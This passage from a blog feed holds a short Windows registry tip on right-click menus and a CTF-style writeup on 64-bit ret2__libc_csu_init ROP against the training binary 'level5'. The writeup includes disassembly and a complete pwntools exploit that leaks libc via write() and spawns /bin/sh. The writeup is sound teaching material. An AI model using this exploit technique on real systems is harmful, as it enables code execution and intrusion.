    <content type="html"><![CDATA[<p>Windows下不想要总是先打开软件，再把文件拖进去。那就可以修改一下右键菜单。</p><a id="more"></a><h1 id="修改文件右键菜单"><a href="#修改文件右键菜单" class="headerlink" title="修改文件右键菜单"></a>修改文件右键菜单</h1><p>查壳还有调试的时候总是把文件拖来拖去实在太麻烦了，不如修改一下，直接右键就能开始分析。下面就记录一下修改文件右键菜单的过程：</p><p>首先打开注册表：</p><p><img src="/pics/为Windows系统鼠标右键添加软件和图标/1.png" alt="打开注册表"></p><p>依次进入<code>计算机\HKEY_CLASSES_ROOT\*\shell</code>，在<code>shell</code>项下新建一个项，这里以PEID为例。然后在新建好的<code>PEID</code>项下，新建字符串值，命名为<code>Icon</code>，并将其值修改为源文件的绝对路径（<code>$PATH_TO_EXE</code>）：</p><p><img src="/pics/为Windows系统鼠标右键添加软件和图标/2.png" alt="新建字符串值"></p><p>最后再在<code>PEID</code>项下新建项<code>Command</code>，修改其值为<code>&quot;$PATH_TO_EXE&quot; &quot;%1&quot;</code>：</p><p><img src="/pics/为Windows系统鼠标右键添加软件和图标/3.png" alt="新建Command并修改值"></p><p>成功后看一看效果：</p><p><img src="/pics/为Windows系统鼠标右键添加软件和图标/4.png" alt="效果"></p><h1 id="修改空白处右键菜单"><a href="#修改空白处右键菜单" class="headerlink" title="修改空白处右键菜单"></a>修改空白处右键菜单</h1><p>在当前目录下打开<code>cmd</code>窗口太麻烦，不如也添加到右键菜单里：</p><p>首先同样打开注册表。进入<code>计算机\HKEY_CLASSES_ROOT\Directory\Background\shell</code>，新建项<code>在此运行CMD</code>，同以上一样新建字符串值<code>Icon</code>，并修改值：</p><p><img src="/pics/为Windows系统鼠标右键添加软件和图标/5.png" alt="添加字符串值"></p><p>在<code>在此运行CMD</code>下新建项<code>Command</code>，修改值为<code>$PATH_TO_EXE</code>，这里不需要双引号<code>&quot;</code>，也不需要<code>%1</code>：</p><p><img src="/pics/为Windows系统鼠标右键添加软件和图标/6.png" alt="新建Command并修改值"></p><p>看看效果：</p><p><img src="/pics/为Windows系统鼠标右键添加软件和图标/7.png" alt="效果"></p><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://blog.csdn.net/p312011150/article/details/81207059" target="_blank" rel="noopener">https://blog.csdn.net/p312011150/article/details/81207059</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Windows下不想要总是先打开软件，再把文件拖进去。那就可以修改一下右键菜单。&lt;/p&gt;
    
    </summary>
    
    
      <category term="solution" scheme="https://qianfei11.github.io/tags/solution/"/>
    
  </entry>
  
  <entry>
    <title>中级ROP-ret2__libc_csu_init-writeup</title>
    <link href="https://qianfei11.github.io/2019/02/12/%E4%B8%AD%E7%BA%A7ROP-ret2-libc-csu-init-writeup/"/>
    <id>https://qianfei11.github.io/2019/02/12/中级ROP-ret2-libc-csu-init-writeup/</id>
    <published>2019-02-12T10:02:50.000Z</published>
    <updated>2019-02-14T01:40:26.013Z</updated>
    
    <content type="html"><![CDATA[<p>用蒸米的一步一步学ROP之linux_x64篇中的level5来研究一下64位的ROP。</p><a id="more"></a><p>64位的程序中，函数所调用的参数并不是全部在栈上，前六个参数分别位于<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>和<code>r9</code>，其余参数则在栈上。同时，可以使用的内存地址不能大于<code>0x00007fffffffffff</code>，否则会抛出异常。所以64位的程序需要通过rop或者libc中的函数来设置参数。</p><h1 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h1><p>程序给出的源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> _FORTIFY_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只开了NX，那么<code>vulnerable_function()</code>中的栈溢出是很显然的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/assassinq/pwn/ROP_STEP_BY_STEP/linux_x64/level5_ori/level5'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>没有任何可辅助的函数，同时也找不到可用的gadgets来用，这里就要用到libc中的一个函数<code>__libc_csu_init()</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005A0                 mov     [rsp+var_28], rbp</span><br><span class="line">.text:00000000004005A5                 mov     [rsp+var_20], r12</span><br><span class="line">.text:00000000004005AA                 lea     rbp, cs:600E24h</span><br><span class="line">.text:00000000004005B1                 lea     r12, cs:600E24h</span><br><span class="line">.text:00000000004005B8                 mov     [rsp+var_18], r13</span><br><span class="line">.text:00000000004005BD                 mov     [rsp+var_10], r14</span><br><span class="line">.text:00000000004005C2                 mov     [rsp+var_8], r15</span><br><span class="line">.text:00000000004005C7                 mov     [rsp+var_30], rbx</span><br><span class="line">.text:00000000004005CC                 sub     rsp, 38h</span><br><span class="line">.text:00000000004005D0                 sub     rbp, r12</span><br><span class="line">.text:00000000004005D3                 mov     r13d, edi</span><br><span class="line">.text:00000000004005D6                 mov     r14, rsi</span><br><span class="line">.text:00000000004005D9                 sar     rbp, 3</span><br><span class="line">.text:00000000004005DD                 mov     r15, rdx</span><br><span class="line">.text:00000000004005E0                 call    _init_proc</span><br><span class="line">.text:00000000004005E5                 test    rbp, rbp</span><br><span class="line">.text:00000000004005E8                 jz      short loc_400606</span><br><span class="line">.text:00000000004005EA                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005EC                 nop     dword ptr [rax+00h]</span><br><span class="line">.text:00000000004005F0</span><br><span class="line">.text:00000000004005F0 loc_4005F0:                             ; CODE XREF: __libc_csu_init+64↓j</span><br><span class="line">.text:00000000004005F0                 mov     rdx, r15</span><br><span class="line">.text:00000000004005F3                 mov     rsi, r14</span><br><span class="line">.text:00000000004005F6                 mov     edi, r13d</span><br><span class="line">.text:00000000004005F9                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004005FD                 add     rbx, 1</span><br><span class="line">.text:0000000000400601                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400604                 jnz     short loc_4005F0</span><br><span class="line">.text:0000000000400606</span><br><span class="line">.text:0000000000400606 loc_400606:                             ; CODE XREF: __libc_csu_init+48↑j</span><br><span class="line">.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]</span><br><span class="line">.text:000000000040060B                 mov     rbp, [rsp+38h+var_28]</span><br><span class="line">.text:0000000000400610                 mov     r12, [rsp+38h+var_20]</span><br><span class="line">.text:0000000000400615                 mov     r13, [rsp+38h+var_18]</span><br><span class="line">.text:000000000040061A                 mov     r14, [rsp+38h+var_10]</span><br><span class="line">.text:000000000040061F                 mov     r15, [rsp+38h+var_8]</span><br><span class="line">.text:0000000000400624                 add     rsp, 38h</span><br><span class="line">.text:0000000000400628                 retn</span><br></pre></td></tr></table></figure><p>可以看到在<code>loc_4005F0</code>之后，有对第三个参数<code>rdx</code>、第二个参数<code>rsi</code>以及第一个参数<code>rdi</code>的<code>mov</code>操作。同时如果合理设置<code>r12</code>和<code>rbx</code>的大小，我们能够做到<code>call</code>某个函数。尾巴上还有<code>mov</code>栈上的值到一些寄存器中，仔细观察可以发现这和之前的参数也有一些联系。构造出一个<code>csu()</code>的函数。因为在第二次跳转上去后，还有一次<code>add rsp, 0x38</code>，所以需要在栈上再补56个byte：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  4005f0:       4c 89 fa                mov    rdx,r15</span></span><br><span class="line"><span class="comment">#  4005f3:       4c 89 f6                mov    rsi,r14</span></span><br><span class="line"><span class="comment">#  4005f6:       44 89 ef                mov    edi,r13d</span></span><br><span class="line"><span class="comment">#  4005f9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]</span></span><br><span class="line"><span class="comment">#  4005fd:       48 83 c3 01             add    rbx,0x1</span></span><br><span class="line"><span class="comment">#  400601:       48 39 eb                cmp    rbx,rbp</span></span><br><span class="line"><span class="comment">#  400604:       75 ea                   jne    4005f0 &lt;__libc_csu_init+0x50&gt;</span></span><br><span class="line"><span class="comment">#  400606:       48 8b 5c 24 08          mov    rbx,QWORD PTR [rsp+0x8]</span></span><br><span class="line"><span class="comment">#  40060b:       48 8b 6c 24 10          mov    rbp,QWORD PTR [rsp+0x10]</span></span><br><span class="line"><span class="comment">#  400610:       4c 8b 64 24 18          mov    r12,QWORD PTR [rsp+0x18]</span></span><br><span class="line"><span class="comment">#  400615:       4c 8b 6c 24 20          mov    r13,QWORD PTR [rsp+0x20]</span></span><br><span class="line"><span class="comment">#  40061a:       4c 8b 74 24 28          mov    r14,QWORD PTR [rsp+0x28]</span></span><br><span class="line"><span class="comment">#  40061f:       4c 8b 7c 24 30          mov    r15,QWORD PTR [rsp+0x30]</span></span><br><span class="line"><span class="comment">#  400624:       48 83 c4 38             add    rsp,0x38</span></span><br><span class="line"><span class="comment">#  400628:       c3                      ret</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, ret_addr)</span>:</span></span><br><span class="line">    <span class="comment"># function = r12</span></span><br><span class="line">    <span class="comment"># rdi = r13, rsi = r14, rdx = r15</span></span><br><span class="line">payload = flat([<span class="string">'\x00'</span> * <span class="number">136</span>, <span class="number">0x400606</span>, <span class="number">0</span>, rbx, rbp, r12, r13, r14, r15, <span class="number">0x4005f0</span>, <span class="string">'\x00'</span> * <span class="number">56</span>, ret_addr])</span><br><span class="line"><span class="comment"># print repr(payload)</span></span><br><span class="line">p.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h1 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h1><p>然后接下来的主要分为三步。第一步泄漏出<code>write()</code>函数的地址，以获取libc：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># write(STDOUT_FILENO, write_got, 8);</span></span><br><span class="line"><span class="comment"># r12 = write_got</span></span><br><span class="line"><span class="comment"># rdi = 1, rsi = write_got, rdx = 8</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; OUTPUT &amp;write_got &lt;&lt;&lt;'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, write_got, <span class="number">8</span>, main)</span><br><span class="line">write = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'write = '</span> + hex(write))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write)</span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; SEARCHING FOR LIBC &lt;&lt;&lt;'</span>)</span><br><span class="line">libc_base = write - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">execve = libc_base + libc.dump(<span class="string">'execve'</span>)</span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">log.success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">log.success(<span class="string">'execve = '</span> + hex(execve))</span><br></pre></td></tr></table></figure><p>这里对libc的泄漏同样也可以通过<code>DynELF</code>来爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, address, <span class="number">8</span>, main_addr)</span><br><span class="line">data = p.recv(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; LEAK libc &lt;&lt;&lt;'</span>)</span><br><span class="line">dynelf = DynELF(leak, elf=elf)</span><br><span class="line">system_addr = dynelf.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br></pre></td></tr></table></figure><p>拿到libc后可以获得<code>system</code>或者是<code>execve</code>的偏移。同时我们发现bss段可写，故接下来在bss段写入system的地址，以及字符串<code>/bin/sh</code>：</p><p><img src="/pics/中级ROP-ret2__libc_csu_init-writeup/1.png" alt="bss段可写"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># read(STDIN_FILENO, bss, 16)</span></span><br><span class="line"><span class="comment"># r12 = read_got</span></span><br><span class="line"><span class="comment"># rdi = 0, rsi = bss, rdx = 16</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; INPUT execve/system AND str_bin_sh &lt;&lt;&lt;'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss, <span class="number">16</span>, main)</span><br><span class="line">payload = flat([system, <span class="string">'/bin/sh\x00'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>最后一部只需要执行<code>call</code>已经写入的system并且将<code>/bin/sh</code>作为参数执行即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># execve("/bin/sh"); or system("/bin/sh");</span></span><br><span class="line"><span class="comment"># r12 = execve/system</span></span><br><span class="line"><span class="comment"># rdi = bss + 8 = "/bin/sh"</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; EXECUTE execve("/bin/sh") OR system("/bin/sh") &lt;&lt;&lt;'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss, bss + <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main)</span><br></pre></td></tr></table></figure><p>整理一下，最后的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">p = process(<span class="string">'./level5'</span>)</span><br><span class="line"><span class="comment"># p = remote('127.0.0.1',10001)</span></span><br><span class="line">elf = ELF(<span class="string">'./level5'</span>)</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">bss = elf.bss()</span><br><span class="line">log.success(<span class="string">'write_got = '</span> + hex(write_got))</span><br><span class="line">log.success(<span class="string">'read_got = '</span> + hex(read_got))</span><br><span class="line">log.success(<span class="string">'main = '</span> + hex(main))</span><br><span class="line">log.success(<span class="string">'bss = '</span> + hex(bss))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  4005f0:       4c 89 fa                mov    rdx,r15</span></span><br><span class="line"><span class="comment">#  4005f3:       4c 89 f6                mov    rsi,r14</span></span><br><span class="line"><span class="comment">#  4005f6:       44 89 ef                mov    edi,r13d</span></span><br><span class="line"><span class="comment">#  4005f9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]</span></span><br><span class="line"><span class="comment">#  4005fd:       48 83 c3 01             add    rbx,0x1</span></span><br><span class="line"><span class="comment">#  400601:       48 39 eb                cmp    rbx,rbp</span></span><br><span class="line"><span class="comment">#  400604:       75 ea                   jne    4005f0 &lt;__libc_csu_init+0x50&gt;</span></span><br><span class="line"><span class="comment">#  400606:       48 8b 5c 24 08          mov    rbx,QWORD PTR [rsp+0x8]</span></span><br><span class="line"><span class="comment">#  40060b:       48 8b 6c 24 10          mov    rbp,QWORD PTR [rsp+0x10]</span></span><br><span class="line"><span class="comment">#  400610:       4c 8b 64 24 18          mov    r12,QWORD PTR [rsp+0x18]</span></span><br><span class="line"><span class="comment">#  400615:       4c 8b 6c 24 20          mov    r13,QWORD PTR [rsp+0x20]</span></span><br><span class="line"><span class="comment">#  40061a:       4c 8b 74 24 28          mov    r14,QWORD PTR [rsp+0x28]</span></span><br><span class="line"><span class="comment">#  40061f:       4c 8b 7c 24 30          mov    r15,QWORD PTR [rsp+0x30]</span></span><br><span class="line"><span class="comment">#  400624:       48 83 c4 38             add    rsp,0x38</span></span><br><span class="line"><span class="comment">#  400628:       c3                      ret</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, ret_addr)</span>:</span></span><br><span class="line">payload = flat([<span class="string">'\x00'</span> * <span class="number">136</span>, <span class="number">0x400606</span>, <span class="number">0</span>, rbx, rbp, r12, r13, r14, r15, <span class="number">0x4005f0</span>, <span class="string">'\x00'</span> * <span class="number">56</span>, ret_addr])</span><br><span class="line"><span class="comment"># print repr(payload)</span></span><br><span class="line">p.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rdi = edi = r13, rsi = r14, rdx = r15</span></span><br><span class="line"><span class="comment"># write(STDOUT_FILENO, write_got, 8);</span></span><br><span class="line"><span class="comment"># r12 = write_got</span></span><br><span class="line"><span class="comment"># rdi = 1, rsi = write_got, rdx = 8</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; OUTPUT &amp;write_got &lt;&lt;&lt;'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, write_got, <span class="number">8</span>, main)</span><br><span class="line">write = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'write = '</span> + hex(write))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write)</span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; SEARCHING FOR LIBC &lt;&lt;&lt;'</span>)</span><br><span class="line">libc_base = write - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">execve = libc_base + libc.dump(<span class="string">'execve'</span>)</span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">log.success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">log.success(<span class="string">'execve = '</span> + hex(execve))</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(STDIN_FILENO, bss, 16);</span></span><br><span class="line"><span class="comment"># r12 = read_got</span></span><br><span class="line"><span class="comment"># rdi = 0, rsi = bss, rdx = 16</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; INPUT execve/system AND str_bin_sh &lt;&lt;&lt;'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss, <span class="number">16</span>, main)</span><br><span class="line">payload = flat([system, <span class="string">'/bin/sh\x00'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execve("/bin/sh"); or system("/bin/sh");</span></span><br><span class="line"><span class="comment"># r12 = execve/system</span></span><br><span class="line"><span class="comment"># rdi = bss + 8 = "/bin/sh"</span></span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; EXECUTE execve("/bin/sh") OR system("/bin/sh") &lt;&lt;&lt;'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss, bss + <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main)</span><br><span class="line">log.info(<span class="string">'&gt;&gt;&gt; PWNED BY ASSASSINQ &lt;&lt;&lt;'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>做题的时候遇到的一个小bug是当传的payload中的无意义字符如果不为<code>\x00</code>，最后跑system会坏掉，但是execve不会影响。如果将buf填充为<code>\x00</code>，才可以执行system。具体原因还没有弄清楚。</p><p>以下再补充一点关于<code>__libc_csu_init()</code>的点，也就是隐藏gadgets：</p><p><img src="/pics/中级ROP-ret2__libc_csu_init-writeup/2.png" alt="隐藏gadgets"></p><p>也是libc设计时的一个bug，不同的偏移下，还能够得到<code>pop rdi ; ret</code>和<code>pop rsi ; pop r15 ; ret</code>两个gadgets：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; x/5i 0x000000000040061A</span><br><span class="line">   0x40061a &lt;__libc_csu_init+90&gt;:pop    rbx</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">assassinq&gt;&gt; x/5i 0x000000000040061B</span><br><span class="line">   0x40061b &lt;__libc_csu_init+91&gt;:pop    rbp</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">assassinq&gt;&gt; x/5i 0x000000000040061C</span><br><span class="line">   0x40061c &lt;__libc_csu_init+92&gt;:pop    r12</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">assassinq&gt;&gt; x/5i 0x000000000040061D</span><br><span class="line">   0x40061d &lt;__libc_csu_init+93&gt;:pop    rsp</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">assassinq&gt;&gt; x/5i 0x000000000040061E</span><br><span class="line">   0x40061e &lt;__libc_csu_init+94&gt;:pop    r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:ret    </span><br><span class="line">   0x400625:nop</span><br><span 